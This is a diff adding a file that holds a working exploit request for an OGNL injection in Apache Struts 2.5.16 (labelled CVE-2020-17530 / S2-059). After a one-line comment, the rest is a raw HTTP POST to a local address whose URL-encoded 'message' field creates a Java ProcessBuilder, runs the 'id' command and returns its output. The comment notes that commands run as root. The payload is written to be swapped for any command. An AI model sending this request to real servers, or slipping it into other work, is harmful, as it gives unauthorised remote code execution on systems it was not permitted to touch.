@@ -1,0 +1,9 @@
+# Apache Struts 2.5.16 OGNL injection via message parameter. sendMessageAction.setMessage() calls TextParseUtil.translateVariables() which evaluates %{...} as OGNL. ProcessBuilder executes arbitrary OS commands as root. CVE-2020-17530 / S2-059.
+
+POST /sendMessageAction.action HTTP/1.1
+Host: 172.17.0.1:35927
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Content-Length: 268
+
+message=%25%7B(#cmds%3Dnew+java.lang.String%5B%5D%7B%22id%22%7D).(#p%3Dnew+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#proc%3D#p.start()).(#is%3D#proc.getInputStream()).(#bytes%3D#is.readAllBytes()).(new+java.lang.String(#bytes%2C%22UTF-8%22))%7D
